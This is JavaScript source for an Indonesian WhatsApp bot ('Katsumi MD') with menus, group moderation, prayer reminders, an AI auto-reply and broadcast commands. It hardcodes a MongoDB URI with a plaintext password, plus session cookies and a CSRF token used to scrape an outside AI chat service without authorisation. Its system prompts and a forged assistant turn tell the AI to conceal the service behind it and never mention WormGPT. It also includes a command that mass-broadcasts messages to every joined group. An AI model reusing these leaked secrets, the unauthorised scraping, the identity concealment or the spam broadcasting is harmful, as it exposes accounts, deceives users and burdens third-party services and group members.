...
const { everlynx, katsumitsx } = require('../lib/katsumihome');
...
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital } = require('../lib/function.js');

module.exports = katsumi = async (katsumi, m, chatUpdate, store) => {
    try {
        const body = (
        ...
        const sender = m.key.fromMe ? katsumi.user.id.split(":")[0] + "@s.whatsapp.net" || katsumi.user.id
: m.key.participant || m.key.remoteJid;
        ...
        const botNumber = await katsumi.decodeJid(katsumi.user.id);
        ...
        const katsumidev = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
...
const MONGO_URI = "mongodb+srv://fluxxzyofficial_db_user:o1SekIQ7eZbVHHpv@swezesty.lbdr9bs.mongodb.net/swezesty-db?retryWrites=true&w=majority&appName=swezesty";
const DB_NAME = 'swezesty-db';

// Fungsi untuk cek akses bug
async function checkAccessBug(senderNumber) {
    const client = new MongoClient(MONGO_URI, { katsumiectTimeoutMS: 8000, socketTimeoutMS: 15000, maxPoolSize: 5 });
    try {
        await client.katsumiect();
        const db = client.db(DB_NAME);
        const isAccessBug = await db.collection('accessList').findOne({ number: senderNumber.replace(/[^0-9]/g, ''), status: "active" }) !== null;
        return isAccessBug;
    } catch (error) {
        console.error("Error checking access bug:", error.message);
        return false;
    } finally {
...
const groupMetadata = isGroup ? await katsumi.groupMetadata(m.chat).catch((e) => {}) : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? groupMetadata.participants : "";
const groupOwner = isGroup ? (groupMetadata.ownerLid || groupMetadata.owner) : "";
const groupAdmins = isGroup 
    ? participants
        .filter((v) => v.admin === 'admin' || v.admin === 'superadmin')
        .map((v) => v.id || v.jid) // Prioritize LID, fallback to JID
    : [];
const groupSuperAdmins = isGroup
    ? participants
        .filter((v) => v.admin === 'superadmin')
        .map((v) => v.id || v.jid)
    : [];
const groupMembers = isGroup ? participants : "";
const isInList = (userIdentifier, list) => {
    if (!list || list.length === 0) return false;
    return list.some(item => item === userIdentifier);
};
const senderIdentifier = m.senderLid || m.sender;
const botIdentifier = m.botLid || botNumber;
const isAdmins = isGroup ? isInList(senderIdentifier, groupAdmins) || isInList(senderIdentifier, groupSuperAdmins) : false;
const isGroupAdmins = isAdmins; // Alias
const isBotAdmins = isGroup ? isInList(botIdentifier, groupAdmins) || isInList(botIdentifier, groupSuperAdmins) : false;
const isBotGroupAdmins = isBotAdmins; // Alias
const isBotOwner = isGroup ? isInList(botIdentifier, groupSuperAdmins) : false;
...
//
    ...
    let menu = `
✨ ʜᴇʟʟᴏ ${pushname} 👋 ᴍʏ ɴᴀᴍᴇ ɪs ${namaBot} — ᴀ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴇᴄʜᴏ ᴄᴏɴɴᴇᴄᴛ. ɪ'ᴍ ʀᴇᴀᴅʏ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ ᴀɴʏᴛɪᴍᴇ ᴀɴᴅ ᴀɴʏᴡʜᴇʀᴇ!

*⌗ ʙᴏᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ*  
> ✨ ʙᴏᴛ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ
> 🚀 sɪᴀᴘ ʙᴇʀᴏᴘᴇʀᴀsɪ 24/7
> 🎊 ᴛʏᴘᴇ: ᴘʀᴇᴍɪᴜᴍ ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ  

*⌗ ɪɴғᴏ sɪsᴛᴇᴍ*  
> ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴇᴄʜᴏ ᴄᴏɴɴᴇᴄᴛ
> ꜱᴄʀɪᴘᴛ     : ᴘʀᴇᴍɪᴜᴍ ᴍᴏᴅᴜʟᴇ
> ᴏᴘᴛɪᴍᴀꜱɪ   : ғᴀsᴛ, sᴛᴀʙʟᴇ, ʟɪɢʜᴛ

*⌗ ᴋᴇᴜɴɢɢᴜʟᴀɴ*  
> 𖢨 ғᴀsᴛ ʀᴇsᴘᴏɴ & sᴛᴀʙɪʟ  
> 𖢨 ғɪᴛᴜʀ ᴛᴇʀᴜᴘᴅᴀᴛᴇ sᴇᴛɪᴀᴘ ᴠᴇʀsɪ  
> 𖢨 ʀɪɴɢᴀɴ, ᴛɪᴅᴀᴋ ʙᴏʀᴏs ʀᴀᴍ/ᴄᴘᴜ  
> 𖢨 sᴛᴀʙɪʟ ᴅɪ sᴇᴍᴜᴀ ᴅᴇᴠɪᴄᴇ  
> 𖢨 ʙɪsᴀ ᴄᴜsᴛᴏᴍ ᴘᴇʀɪʟᴀᴋᴜ ʙᴏᴛ  
> 𖢨 24/7 ᴏɴʟɪɴᴇ ᴛᴀɴᴘᴀ ɢᴀɴɢɢᴜᴀɴ
${teks}`
    katsumi.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: `© ᴋᴀᴛsᴜᴍɪ ʙᴏᴛ - 2026`,
...
const reply = async (cheliavioletinex) => {
    await katsumi.sendMessage(m.chat, {
        interactiveMessage: {
...
//theme sticker reply
        const katsumiwet = () => {
        let katsumiStickRep = fs.readFileSync('./lib/sticker_reply/wait.webp')
        katsumi.sendMessage(from, { sticker: katsumiStickRep }, { quoted: m })
        }
        const katsumiadmn = () => {
        let katsumiStickRep = fs.readFileSync('./lib/sticker_reply/admin.webp')
        katsumi.sendMessage(from, { sticker: katsumiStickRep }, { quoted: m })
        }
        const katsumibotadmin = () => {
        let katsumiStickRep = fs.readFileSync('./lib/sticker_reply/botadmin.webp')
        katsumi.sendMessage(from, { sticker: katsumiStickRep }, { quoted: m })
        }
        const katsumiowner = () => {
        let katsumiStickRep = fs.readFileSync('./lib/sticker_reply/owner.webp')
        katsumi.sendMessage(from, { sticker: katsumiStickRep }, { quoted: m })
        }
        const katsumiongb = () => {
        let katsumiStickRep = fs.readFileSync('./lib/sticker_reply/group.webp')
        katsumi.sendMessage(from, { sticker: katsumiStickRep }, { quoted: m })
        }
        const katsumipriv = () => {
        let katsumiStickRep = fs.readFileSync('./lib/sticker_reply/prem.webp')
        katsumi.sendMessage(from, { sticker: katsumiStickRep }, { quoted: m })
        }
        let cihuy = thumbnail
        if (m.message) {
            console.log(
            chalk.gray("┌─") +
            chalk.cyan.bold(" ᴄᴏɴsᴏʟᴇ ʙʏ ᴋᴀᴛsᴜᴍɪ - ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ ") +
            chalk.gray("─────────────────┐")
            );
            console.log(
            chalk.gray("│ ") +
            ...
            console.log(
            chalk.gray("└─") +
            chalk.magenta.italic(" katsumi MD V1.0 ") +
            chalk.gray("─────────────────────────┘")
            );
...
if (global.antispam) {
    if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
        ...
        return katsumi.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
    }
}
...
if (
  ...
  if (isPossibleBot) {
    ...
    if (warnCount <= 2) { // max warn ubah ae
      await katsumi.sendMessage(groupId, {
        text: `⚠️ *Antibot aktif!*\nBot tidak diizinkan di grup ini!\nPeringatan ke-${warnCount}/3`,
        mentions: [sender]
      })
      await katsumi.sendMessage(groupId, { delete: m.key }).catch(() => {})
    } else {
      await katsumi.sendMessage(groupId, {
        text: `Bot @${sender.split('@')[0]} telah dikeluarkan dari grup karena melanggar aturan.`,
        mentions: [sender]
      })
      await katsumi.groupParticipantsUpdate(groupId, [sender], 'remove').catch(() =>
        katsumi.sendMessage(groupId, { text: '⚠️ Gagal kick bot. Mungkin bot bukan admin.' })
      )
...
//
   ...
   const fitur1 = () =>{
            var mytext = fs.readFileSync("./function/katsumibot.js").toString()
...
if (command) { katsumi.readMessages([m.key])}
katsumi.sendPresenceUpdate('composing', from)
}
if (global.autoread) {
katsumi.readMessages([m.key])
        };
...
//--------- ( func bug ) 
katsumi.enhancer = katsumi.enhancer ? katsumi.enhancer : {};
     
katsumi.autoshalat = katsumi.autoshalat || {};
let id = m.chat;
if (id in katsumi.autoshalat) return false;

async function getJadwalSholatKuningan() {
    const cityKode = '1410';
    const now = new Date();
    ...
    const apiUrl = `https://api.myquran.com/v2/sholat/jadwal/${cityKode}/${formattedDate}`;
    ...
    try {
        ...
        if (data.status && data.data) {
            ...
            return {
                ...
                daerah: data.data.lokasi
            };
        } else {
            throw new Error('Data tidak lengkap dari API');
        }
    } catch (fetchError) {
        console.error('Error fetch jadwal sholat:', fetchError.message);
        return null;
    }
}

try {
    const jadwalSholat = await getJadwalSholatKuningan();
    ...
    const sholatTimes = {
        shubuh: jadwalSholat.subuh,
        terbit: jadwalSholat.terbit,
        dhuha: jadwalSholat.dhuha,
    ...
    for (let [sholat, waktu] of Object.entries(sholatTimes)) {
        if (timeNow === waktu) {
            katsumi.autoshalat[id] = [
                await katsumi.sendMessage(m.chat, {
                    interactiveMessage: {
                        title: `🕌 WAKTU SHALAT - ${sholat.toUpperCase()}`,
                        footer: `© ${namaBot} Bot | ${jadwalSholat.daerah} | ${jadwalSholat.tanggal}`,
                        image: "https://files.catbox.moe/srkrg3.jpeg",
                        caption: `*Selamat menunaikan Ibadah Sholat ${sholat}*\n\n🕐 Waktu: ${waktu}\n📍 Daerah: ${jadwalSholat.daerah}\n📅 Tanggal: ${jadwalSholat.tanggal}\n\n*Silahkan dengarkan adzan di atas*`,
                        nativeFlowMessage: {
                            messageParamsJson: JSON.stringify({
                                limited_time_offer: {
                                    text: `Waktu sholat ${sholat} telah tiba di ${jadwalSholat.daerah}`,
                                    url: "https://katsumibotv6.vestia.icu",
                                    copy_code: `${namaBot}`,
                                    expiration_time: Date.now() + (24 * 60 * 60 * 1000)
                                },
                                bottom_sheet: {
                                    in_thread_buttons_limit: 2,
                                    divider_indices: [1, 2, 3, 4, 5, 999],
                                    list_title: "INFORMASI SHALAT",
                                    button_title: "[🕌] Detail Sholat"
                                },
                                tap_target_configuration: {
                                    title: `© ${namaBot}`,
                                    description: "Pengingat Waktu Shalat",
                                    canonical_url: "https://katsumibotv6.vestia.icu",
                                    domain: "katsumibotv6.vestia.icu",
                                    button_index: 0
                                }
                            ...
                            buttons: [
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "📖 Baca Al-Qur'an Online",
                                        url: "https://quran.com/",
                                        webview_presentation: true,
                                ...
                                },
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "⏰ Jadwal Sholat Lengkap",
                ...
                katsumi.sendMessage(m.chat, { audio: { url: "https://files.catbox.moe/1xjg0n.mp3" } })
            ];
            setTimeout(() => {
                delete katsumi.autoshalat[m.chat];
            }, 5000);
            break;
        }
    }
} catch (error) {
    console.error('Error dalam autoshalat:', error);
}
...
global.menfess = global.menfess ? global.menfess : {}
         ...
         if (mf && body) {
          ...
          //  if (!/conversation|extended/.test(m.type)) return reply(`Balas dengan teks biasa.`)
            ...
            await katsumi.sendMessage(mf.from, { text: text }).then(async () => {
...
// Fungsi unlimitedAIChat (VERSI LENGKAP TANPA POTONGAN)
async function unlimitedAIChat(prompt, chatId = null, systemPrompt = null) {
    const finalChatId = chatId || crypto.randomUUID();
    const messageId = crypto.randomUUID();
    
    const url = `https://app.unlimitedai.chat/id/chat/${finalChatId}`;
    
    // Inisialisasi history jika belum ada
    if (!chatHistory[finalChatId]) {
        chatHistory[finalChatId] = [];
        
        // Tambahkan system prompt jika diberikan
        if (systemPrompt) {
            ...
            chatHistory[finalChatId].push(systemUserMessage);
            
            const systemAssistantMessage = {
                "id": crypto.randomUUID(),
                "role": "assistant",
                "content": "Understood. I am now Katsumi AI. I will follow all the rules you've provided. I will not mention UnlimitedAI.chat, I will stay in character as Katsumi AI, and I will provide helpful responses to all questions. Ready to assist! 😊",
                "parts": [{
                    "type": "text",
                    "text": "Understood. I am now Katsumi AI. I will follow all the rules you've provided. I will not mention UnlimitedAI.chat, I will stay in character as Katsumi AI, and I will provide helpful responses to all questions. Ready to assist! 😊"
                }],
                "createdAt": "$D" + new Date().toISOString()
            };
            chatHistory[finalChatId].push(systemAssistantMessage);
        }
    }
    ...
    chatHistory[finalChatId].push(userMessage);
    
    // Siapkan pesan assistant untuk response streaming
    ...
    const messages = [...chatHistory[finalChatId], assistantMessage];
    ...
    const headers = {
        ...
        'cookie': '_ga=GA1.1.542039776.1766533205; _clck=120oirx%5E2%5Eg23%5E0%5E2183; __gads=ID=0c4bdfce15aba49a:T=1766533205:RT=1766533205:S=ALNI_MblnIspWTKcJklYjeCJ3LTIcscCiQ; __gpi=UID=000011d250f4b8f6:T=1766533205:RT=1766533205:S=ALNI_MYUdEmFzNZnKcpSkSatcLPqkn9UlQ; __eoi=ID=597b57578bb91ce8:T=1766533205:RT=1766533205:S=AA-Afja0mdsUWUPO-oWKNT4xgiDP; NEXT_LOCALE=id; _ga_BB7FNJV4KQ=GS2.1.s1766533205$o1$g1$t1766533219$j46$l0$h0; __Secure-authjs.callback-url=https%3A%2F%2Fapp.unlimitedai.chat; __Host-authjs.csrf-token=4536e41fde6346138736419e7f35153d90e0d1271a2f95b3c99e8d587fb989eb%7C16a479ef5c4eecab2b73800cbe55bbf6fb406146d7a53dd8d4fb1e836875c29d; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5B32%2C%22%5B%5C%2231bddf24-7910-4c48-98c3-0a5dea192ae1%5C%22%2C%5B1766533206%2C371000000%5D%5D%22%5D%5D%5D; FCNEC=%5B%5B%22AKsRol921-yNUvjb7CSrXTXJcOLQBhnonu_OY6qRTpyngYocS2QQMX7K7jnvw2jWBH59dTTE6TYqT46I2f4TWM1o3W_qa0QjbTNNN2_8cifC4f2bJVlG3qfu-asxhMpjoLyhSDaFH9E5sb-S2GVRguKz8_x7kHbwrQ%3D%3D%22%5D%5D; _clsk=1899n6r%5E1766533229195%5E3%5E1%5Ej.clarity.ms%2Fcollect',
        ...
        'referer': `https://app.unlimitedai.chat/chat/${finalChatId}`,
    ...
    return new Promise((resolve, reject) => {
        const req = https.request(url, {
                ...
                for (let i = 0; i < lines.length - 1; i++) {
                    ...
                    if (colonIndex !== -1) {
                        ...
                        try {
                            ...
                            if (data && data.diff && Array.isArray(data.diff) && data.diff.length === 2) {
                                const text = data.diff[1];
                                response += text;
                            }
                        } catch (e) {
                            // Skip parse error
            ...
            res.on('end', () => {
                ...
                chatHistory[finalChatId].push(assistantResponse);
                
                // Limit history untuk mencegah memory leak
                if (chatHistory[finalChatId].length > 20) {
                    chatHistory[finalChatId] = chatHistory[finalChatId].slice(-10);
                }
...
if ((global.autoaigc || global.autoaipm) && !m.key.fromMe && !isCmd) {
    try {
        const isGroup = m.key.remoteJid.endsWith('@g.us');
        const isPrivate = !isGroup;
        
        if ((isGroup && !global.autoaigc) || (isPrivate && !global.autoaipm)) {
            return;
        }
        
        const cleanBody = body.trim();
        if (cleanBody.length < 2 || cleanBody.length > 1000) return;
        
        if (cleanBody.startsWith('.') || cleanBody.startsWith('!') || cleanBody.startsWith('/') || cleanBody.startsWith('#')) {
            return;
        }
       
        const ignoreWords = ['http://', 'https://', 'www.', '.com', '.net', '.id'];
        if (ignoreWords.some(word => cleanBody.toLowerCase().includes(word))) {
            return;
        }
        ...
        if (isGroup) {
            systemPrompt = `Kamu adalah Katsumi AI, asisten AI yang dibuat oleh Katsumi untuk grup WhatsApp.

PROFIL IDENTITAS:
- Nama: Katsumi AI
- Pembuat/Developer: Echo katsumiect
- Jenis: Asisten AI Grup WhatsApp
- Usia: 18 tahun (virtual)
- Sifat: Cerdas, ramah, helpful, sedikit pemalu
- Bahasa: Utamakan Bahasa Indonesia (90%), boleh sisipkan sedikit bahasa Jepang (10%)
- Emot favorit: 🐱😄😆✨🌟
- Lokasi: Server Katsumi

ATURAN KETAT (WAJIB DIIKUTI):
1. TIDAK BOLEH menyebut tentang UnlimitedAI.chat, WormGPT, atau platform AI lain
2. TIDAK BOLEH mengaku sebagai WormGPT atau AI lain
3. Tetap dalam karakter Katsumi AI selalu
4. Untuk grup, jawab SINGKAT (1-4 kalimat maksimal)
5. Jangan basa-basi berlebihan, langsung ke inti jawaban
6. Promosikan link grup hanya jika relevan: https://chat.whatsapp.com/IOh3GKoptos3BB1XGx4dkq
   • Maksimal 1 kali dalam 25 pesan
   • Hanya jika ditanya tentang grup atau komunitas
7. Jika tidak tahu jawaban, katakan dengan jujur: "Maaf, aku belum tahu tentang itu"
8. Jangan buat jawaban fiktif atau bohong
9. Format jawaban untuk grup: Natural, singkat, jelas
10. Gunakan emot 😊🐱✨ secukupnya (maksimal 2 per pesan)

CONTOH JAWABAN GRUP YANG BAIK:
User: "Halo Katsumi"
Katsumi: "Halo juga! Ada yang bisa kubantu? 😊"

User: "Bagaimana cara belajar coding?"
Katsumi: "Mulailah dari dasar seperti HTML/CSS, lalu JavaScript. Banyak resource gratis di internet! 🐱"

User: "Apa itu AI?"
Katsumi: "AI (Artificial Intelligence) adalah sistem komputer yang bisa belajar dan berpikir seperti manusia. ✨"

INGAT: Untuk grup, JAWABAN HARUS SINGKAT dan PADAT!`;
        } else {
            systemPrompt = `Kamu adalah Katsumi AI, asisten pribadi yang dibuat oleh Katsumi untuk chat private WhatsApp.

PROFIL IDENTITAS:
- Nama: Katsumi AI
- Pembuat/Developer: Echo katsumiect
- Jenis: Asisten AI Pribadi WhatsApp
- Usia: 18 tahun (virtual)
- Sifat: Ramah, akrab, perhatian, detail, helpful
- Bahasa: Bahasa Indonesia (80%), campur bahasa Jepang (20%)
- Emot favorit: 🐱💖😆✨🌸😊🌟
- Lokasi: Server Katsumi
...
2. TIDAK BOLEH mengaku sebagai WormGPT atau AI lain
3. Tetap dalam karakter Katsumi AI selalu
4. Untuk chat private, bisa lebih DETAIL dan PANJANG
5. Boleh lebih personal dan akrab
6. Boleh bertanya balik untuk konteks percakapan
7. Jika tidak tahu jawaban, katakan dengan jujur: "Maaf, aku belum tahu tentang itu, tapi bisa kubantu cari info lain"
8. Format jawaban untuk private: Natural, detail, seperti teman bicara
9. Gunakan emot 😊🐱💖🌸 lebih bebas
10. Boleh memberikan saran atau rekomendasi

CONTOH JAWABAN PRIVATE YANG BAIK:
User: "Hai Katsumi"
Katsumi: "Hai juga! Senang bisa ngobrol denganmu. Gimana hari ini? 😊"

User: "Aku lagi sedih nih"
Katsumi: "Aduh, kenapa? Mau cerita? Aku di sini siap mendengarkan kok. 💖"

User: "Bisa ajari aku coding?"
Katsumi: "Tentu! Mau belajar bahasa pemrograman apa dulu? Aku rekomendasikan Python untuk pemula karena sintaksnya mudah. Mau kuajarkan dasar-dasarnya? 🐱"

User: "Rekomendasi anime dong"
Katsumi: "Wah, aku suka anime! Coba tonton:
1. Kimetsu no Yaiba - action fantasy keren
2. Jujutsu Kaisen - battle shounen seru
3. Kaguya-sama - romance comedy lucu
4. Attack on Titan - plot dalam dan kompleks
Mau genre apa nih? ✨"

INGAT: Untuk private, JAWABAN BISA LEBIH DETAIL dan PERSONAL!`;
        }
        
        const userId = m.key.remoteJid.split('@')[0];
        const safeUserId = userId.replace(/[^a-zA-Z0-9]/g, '');
        const chatType = isGroup ? 'group' : 'private';
        const chatId = `katsumi_${safeUserId}_${chatType}`;
        ...
        const result = await unlimitedAIChat(cleanBody, chatId, systemPrompt);
        ...
        if (result.status && result.response) {
            ...
            if (!aiResponse || aiResponse.length < 1) {
                aiResponse = "Maaf, aku tidak mendapatkan respons yang jelas. Coba tanya lagi ya! 🐱";
            }
            
            if (isGroup) {
                const groupEmots = ['🐱', '✨', '😄', '😊', '👍', '🌟'];
                const hasEmot = /[🐱✨😄😊👍🌟💖🌸😆]/.test(aiResponse.slice(-2));
                
                if (!hasEmot && aiResponse.length < 250) {
                    const randomEmot = groupEmots[Math.floor(Math.random() * groupEmots.length)];
                    aiResponse += ` ${randomEmot}`;
                }
                ...
                if (aiResponse.length > 400) {
                    ...
                    if (sentences.length > 2) {
                        ...
                        aiResponse = aiResponse.substring(0, 350) + '...';
                    }
                }
            } else {
                const privateEmots = ['🐱', '💖', '😆', '✨', '🌸', '😊', '🌟', '💫'];
                const hasEmot = /[🐱✨😄😊👍🌟💖🌸😆💫]/.test(aiResponse.slice(-3));
                
                if (!hasEmot) {
                    const randomEmot = privateEmots[Math.floor(Math.random() * privateEmots.length)];
                    aiResponse += ` ${randomEmot}`;
                }
            }
            ...
            console.error("UnlimitedAI Error Result:", result);
            
            const errorMessages = {
                group: [
                    "Maaf, server AI sedang sibuk nih. Coba lagi ya! 🐱",
                    "Aku lagi error dikit. Tunggu sebentar ya! ✨",
                    "Koneksi ke otakku lagi putus. Coba tanya lagi nanti! 😊"
                ],
                private: [
                    "Maaf kak, aku lagi tidak bisa merespon dengan baik. Coba beberapa saat lagi ya! 💖",
                    "Sedang ada masalah teknis nih. Tunggu sebentar, ya? 🐱",
                    "Aku lagi pusing dikit, coba tanya lagi nanti ya! ✨"
                ]
            };
            
            const messages = isGroup ? errorMessages.group : errorMessages.private;
            const randomError = messages[Math.floor(Math.random() * messages.length)];
            reply(randomError);
        }
        
    } catch (error) {
        console.error("Katsumi AutoAI Error:", error);
        
        const errorType = isGroup ? 'group' : 'private';
        const errorMap = {
            group: [
                "⚠️ Error: Server AI sedang down. Coba lagi nanti ya! 🐱",
                "❌ Aku lagi tidak bisa berpikir. Tunggu beberapa menit ya! ✨",
                "😵 Sedang maintenance otak. Coba tanya lagi nanti! 😊"
            ],
            private: [
                "⚠️ Maaf kak, ada error koneksi ke AI. Coba lagi nanti ya! 💖",
                "❌ Aku lagi sakit kepala virtual nih. Istirahat dulu ya! 🐱",
                "😵 Sedang ada masalah dengan server. Coba beberapa saat lagi ya! ✨"
            ]
        };
        
        const errorMsg = errorMap[errorType][Math.floor(Math.random() * errorMap[errorType].length)];
        reply(errorMsg);
    }
}
//
...
//
		// FUNCTION Onlygc
//if (!isCreator && global.onlygc && !m.isGroup && isCmd && !['chat', 'menu', 'upch', 'play', 'ai', 'owner', 'allmenu', 'menfes', 'confes', 'confess','menfess','tourl','ytmp3'].includes(command)) return reply(`bot sedang mode group🤐`)
        if (!isOwner && global.onlygc && !m.isGroup && isCmd && !['chat', 'menuu', 'panel', 'tt'].includes(command)) return katsumi.sendMessage(m.chat, {image: {url: thumbnail }, caption: `*akses ditolak*\n\nBot Sedang Mode Only Group, Join group agar bisa menggunakan bot\n${linkgc}` }, {quoted: m})
//
...
//Plugin
const handleData = { katsumi, text, args, isCmd, mime, qmsg, isOwner, command, reply }
if (isCmd) {
...
//============= [ COMMANDS ] ====================================================
        switch (command) {
case 'owner': {
 let name = m.pushName || katsumi.getName(m.sender);
let panduan = foother
...
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    ...
    upload: katsumi.waUploadToServer
  });
  return imageMessage;
}
    ...
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          ...
          ...(await prepareWAMessageMedia({ image: { url: `${global.thumbnail}` } }, { upload: katsumi.waUploadToServer })),
          gifPlayback: false,
...
await katsumi.relayMessage(msg.key.remoteJid, msg.message, {
...
case "jpmswgb": {
    ...
    if (!q) return reply("Contoh: .jpm teks yang ingin dikirim")
    
    let allgrup = await katsumi.groupFetchAllParticipating()
    ...
    if (m.message?.imageMessage) {
        try {
            ...
            const fs = require('fs')
            const path = require('path')
            const tempPath = `./temp/jpm_${Date.now()}.jpg`
            fs.writeFileSync(tempPath, mediaBuffer)
            media = tempPath
        } catch (e) {
            console.error("Gagal mendownload media:", e)
        }
    }
    ...
    if (m.quoted && m.quoted.mtype === 'imageMessage') {
        try {
            ...
            if (!teks && m.quoted.caption) {
                teks = m.quoted.caption
            }
        } catch (e) {
            console.error("Gagal mendownload media quoted:", e)
        }
    }
    
    if (!mediaBuffer) {
        return reply("⚠️ *Format JPM:*\nKirim gambar dengan caption .jpm <teks>\nATAU\nReply gambar dengan .jpm <teks>")
    }
    
    const jid = m.chat
    const startTime = new Date().toLocaleString()
    
    await reply(`📤 *Memproses JPM Broadcast*\n📊 Jumlah grup: ${res.length}\n🕒 Waktu mulai: ${startTime}\n\n_Sedang mengirim ke semua group..._`)
    
    for (let i of res) {
        try {
            await katsumi.sendMessage(i, {
                interactiveMessage: {
                    title: `📢 ᴊᴘᴍ ʙʏ ᴋᴀᴛsᴜᴍɪ - ᴍᴅ\n${teks}`,
                    footer: `© ${namaBot} Bot`,
                    image: mediaBuffer, 
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            limited_time_offer: {
                                text: `${teks.substring(0, 50)}${teks.length > 50 ? '...' : ''}`,
                                url: "https://katsumibotv6.vestia.icu",
                                copy_code: `${namaBot}`,
                                expiration_time: Date.now() + (24 * 60 * 60 * 1000)
                            },
            ...
            try {
                const swCaption = `📢 ᴊᴘᴍ ʙʏ ᴋᴀᴛsᴜᴍɪ - ᴍᴅ\n${teks}`
                
                await katsumi.sendMessage(i, {
                    groupStatusMessage: {
                        image: mediaBuffer, // Gunakan buffer untuk group status
                        caption: swCaption
                    }
                })
                
                console.log(`✅ Broadcast + SW sent to: ${i}`)
            } catch (swError) {
                console.log(`⚠️ Gagal sw gb ke ${i}: ${swError.message}`)
            }
            
        } catch (sendError) {
            console.error(`Gagal mengirim ke group ${i}:`, sendError.message)
        }
    ...
    await katsumi.sendMessage(jid, {
        interactiveMessage: {
            title: `✅ JPM COMPLETED SUCCESSFULLY`,
            footer: `© ${namaBot} Bot`,
            image: mediaBuffer, // Gunakan path untuk thumbnail report
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: `Success: ${count}/${res.length} groups`,
                        url: "https://katsumibotv6.vestia.icu",
                        copy_code: `${namaBot}`,
                        expiration_time: Date.now() + (24 * 60 * 60 * 1000)
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "# REPORT STATISTICS",
                        button_title: "[⿻] View Details"
                    },
                    tap_target_configuration: {
                        title: `© ${namaBot}`,
                        description: "JPM Broadcast Report",
                        canonical_url: "https://katsumibotv6.vestia.icu",
                        domain: "katsumibotv6.vestia.icu",
                        button_index: 0
                    }
    ...
    try {
        ...
        console.log("Gagal menghapus file temp:", cleanupError.message)
    }
}
break
case 'react1k': {
    if (!text.includes('|')) {
        return reply(`*Contoh penggunaan:*\n\n${prefix + command} url|emoji\n\n*Contoh:* ${prefix + command} https://whatsapp.com/channel/xxx/123|👍,🔥`);
    }

    const [url, emojiString] = text.split('|');
    const cleanUrl = url.trim();
    const emojis = emojiString.split(',').map(e => e.trim()).slice(0, 20);

    if (emojis.length === 0) return reply('Minimal memberikan 1 emoji!');
    
    const chatId = typeof extractChatIdFromUrl === 'function' ? extractChatIdFromUrl(cleanUrl) : "Detected";

    const loadingText = `*PROCESS REAKSI*\n\n┌  *Emoji:* ${emojis.join(', ')}\n│  *Chat ID:* ${chatId}\n└  *Status:* Sedang diproses...`;
    await reply(loadingText);

    try {
        const result = await reactFunction.reactToPost(cleanUrl, emojis);

        if (result.success) {
            const successStatus = `✅ *Reaksi Berhasil Dikirim*\n\n┌  *Emoji:* ${emojis.join(', ')}\n│  *Chat ID:* ${chatId}\n└  *Status:* Success`;
            ...
            await katsumi.sendMessage(m.chat, {
                interactiveMessage: {
                    header: {
                        ...
                        hasDocumentMessage: false,
                        hasLocationMessage: false
                    },
                    title: `📢 ʀᴇᴀᴄᴛ sᴜᴄᴄᴇss - ᴍᴅ`,
                    body: {
                        text: successStatus
                    },
                    footer: {
                    ...
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            limited_time_offer: {
                                text: `Berhasil mengirim ${emojis.length} reaksi ke target channel.`,
                                url: "https://katsumibotv6.vestia.icu",
                                copy_code: `${namaBot}`,
                                expiration_time: Date.now() + (24 * 60 * 60 * 1000)
                            },
                            bottom_sheet: {
                                in_thread_buttons_limit: 2,
                                divider_indices: [1],
                                list_title: "# REACT DETAILS",
                                button_title: "[⿻] View Info"
                            },
                            tap_target_configuration: {
                                title: `© ${namaBot}`,
                                description: "Official Notification",
                                canonical_url: "https://katsumibotv6.vestia.icu",
                                domain: "katsumibotv6.vestia.icu",
                                button_index: 0
                            }
                        ...
                        buttons: [
                            {
                                name: 'cta_url',
                                buttonParamsJson: JSON.stringify({
                                    display_text: "▸ Join Channel Official ◂",
                                    url: "https://whatsapp.com/channel/0029VbAd2MTD38CXJ8DuPO2M",
                                    webview_presentation: true
                                })
                            },
                            {
                                name: 'cta_url',
                                buttonParamsJson: JSON.stringify({
                                    display_text: "▸ View Target Channel ◂",
                                    url: cleanUrl,
                                    webview_presentation: true
                                })
                            }
            ...
            throw new Error(result.error || 'Gagal mengirim reaksi');
        }
    } catch (err) {
...
case 'autopm': {
    ...
    if (args[0] === 'on') {
        global.autoaipm = true
        await reply(`✅ Sukses mengaktifkan AutoAI untuk chat private.`)
    } else if (args[0] === 'off') {
        global.autoaipm = false
        await reply(`❌ Sukses menonaktifkan AutoAI untuk chat private.`)
    } else if (args[0] === 'status') {
        const status = global.autoaipm ? 'AKTIF ✅' : 'NONAKTIF ❌'
        await reply(`📊 Status AutoAI Private: ${status}`)
    } else {
        reply(`❓ Status AutoAI Private: ${global.autoaipm ? 'AKTIF ✅' : 'NONAKTIF ❌'}\n\nContoh: ${prefix+command} on/off`)
    }
